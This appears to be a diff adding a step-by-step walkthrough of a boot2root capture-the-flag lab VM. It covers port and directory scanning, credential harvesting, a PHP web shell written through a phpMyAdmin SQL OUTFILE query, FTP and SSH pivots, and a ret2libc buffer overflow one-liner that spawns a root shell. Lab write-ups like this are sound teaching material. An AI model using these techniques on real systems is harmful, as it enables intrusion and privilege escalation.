@@ -1,0 +1,124 @@
+1. Install and run VM VirtualBox from Managed Software Center:
+	a) Settings > Network > Adapter 1 > Add an adapter and attach to NAT;
+	b) Global Tools > Create > Add new host;
+	c) Settings > Network > Adapter 2 > Add add host-only Adapter with the added host;
+
+2. Search the IP of VM:
+	a) Open Terminal on the PC;
+	b) Use command:
+		ifconfig
+	c) Look at "<added host: >" line and see that inet IP address is 192.168.56.1	.
+
+3. Use command "nmap" to check all opened ports:
+	a) Open Terminal;
+	b) Execute:
+		nmap 192.168.56.1-255
+
+4. Scan the web server (https://192.168.56.101/) for directories using a dictionary file (wordlists/common.txt) with DIRB tool:
+	a) Install git, if it doesn't exist;
+	b) Execute:
+		git clone https://github.com/v0re/dirb.git
+	c) Then open cloned directory dirb:
+		cd dirb/
+	d) Launch:
+		./configure;
+	e) Build the project using:
+		make
+	f) Check the page:
+		./dirb https://192.168.56.101/ wordlists/common.txt
+
+5. Find for "forum" page:
+	a) One of the URLs from the list of pages of previous paragraph is: https://192.168.56.101/forum/ 	;
+	b) Open "Probleme login ?" topic from user with nick "lmezard";
+	c) After looking through the page you can find for some strange login "!q\]Ej?*5K5cy*AJ";
+	d) Login with username "lmezard" and password "!q\]Ej?*5K5cy*AJ"
+	e) Go to the lmezard user profile and take his e-mail "laurie@borntosec.net".
+
+6. In DRIB output you can find for an e-mail service https://192.168.56.101/webmail/:
+	a) Login with laurie@borntosec.net e-mail address;
+	b) Open "DB Access" message
+	c) You can see root database credentials, Login: root, Password: Fg-'kKXBj87E:aJ$)	.
+	d) In DRIB output you can find for public phpmyadmin server;
+	e) Login using the credentials;
+	f) Use other addional page of DIRB output, for example forum/templates_c;
+	g) Create php script in this folder;
+	h) Use sql query: " select "<?php echo shell_exec('cat /home/LOOKATME/password'); ?>" into outfile "/var/www/forum/templates_c/ololo.php" "
+	i) Copy past sql query from the previus paragraph to the SQL tab in phpmyadmin;
+	j) Open the page: https://192.168.56.101/forum/templates_c/ololo.php with results;
+	k) There is new credentials: lmezard:G!@M6f4Eatau{sF"
+
+7. Install additional tool inetutils to use some internet protocol:
+	a) brew install inetutils
+	b) Use ftp protocol to connect with our VirtualBox using ip: 192.168.56.101;
+	c) Execute:
+		ftp 192.168.56.101
+	d) Login: lmezard , then use password: G!@M6f4Eatau{sF"
+	e) Execute ls command to see two files: "README" and "fun";
+	f) Download the README file using:
+		get README
+	g) Show content of README file:
+		cat README
+	h) There is user name: laurie;
+	i) Download the fun file using:
+		get fun
+
+8. Extract the fun archive:
+ 	a) create directory for the archive output:
+ 		mkdir FunOutput
+ 	b) execute the command to extact file in the FunOutput directory:
+ 		tar -xf fun -C FunOutput
+ 	c) go to the directory with output:
+ 		cd FunOutput
+ 	d) see new ft_fun folder from the archive;
+	e) In ft_fun folder placed parts with C code, which sould be concatenated and compiled.
+	   Use custom JS script to build the final main.c file.
+			node packer_main.js FunOutput/ft_fun
+	f) The output will be some password;
+	g) Use sha256 generator to hash the password, result: 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+
+9. Get access to ssh connection with VM:
+	a) Connect via ssh protocol with the user name:
+		ssh laurie@192.168.56.101
+		Password is 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4.
+	b) See two files "README" and "bomb", via command:
+		ls 
+	c) Using SCP protocol and get files:
+		scp laurie@192.168.56.101:bomb .
+		scp laurie@192.168.56.101:README .
+
+10. Use GHIDRA disassembler to defuse the bomb file:
+	a) "Public speaking is very easy.";
+	b) "1 2 6 24 120 720";
+	c) "1 b 214";
+	d) "9";
+	e) "opekmq";
+	f) "4 2 6 3 1 5";
+	g) The right password is "Publicspeakingisveryeasy.126241207201b2149opekmq426315",
+	but there an issue in answer;
+	h) Password sould be "Publicspeakingisveryeasy.126241207201b2149opekmq426135" as is written on Intra42 forum.
+
+11. In README file "thor" username is given. Connect with the username:
+	a) Execute to connect via ssh:
+		ssh thor@192.168.56.101
+	b) See two files "README" and "turtle", via command:
+		ls
+	c) Download these files using SCP protocol:
+		scp thor@192.168.56.101:turtle .
+		scp thor@192.168.56.101:README .
+	d) In README find for new username 'zaz';
+	e) Open "turtle" file, there are some commands;
+	f) Execute custom script that could paint it:
+		python3 TurtleCommandsPainter.py
+	g) The phrase is "SLASH", to hash it using md5 and get password "646da671ca01bb5d84dbb5fb2238dc8e".
+
+12. Connect to "zaz" user with password "646da671ca01bb5d84dbb5fb2238dc8e" via ssh:
+	a) ssh zaz@192.168.56.101
+	b) There are file "exploit_me" and "mail" directory;
+	c) Find out about ret2libc attack in google;
+	d) Since "exploit_me" is a root file, spwan root shell using ret2libc attack.
+	Use gdb to find for address of system function and "/bin/bash" string:
+	e) Overwrite the %eip register with the system address from libc;
+	f) Put "/bin/sh" address on the stack at %eip+8:
+		./exploit_me $(python -c "print('.'*140 + '\xb7\xe6\xb0\x60'[::-1] + 'ALEX' + '\xb7\xf8\xcc\x58'[::-1])")
+		
+13. Congratulations! You are a ROOT!!!
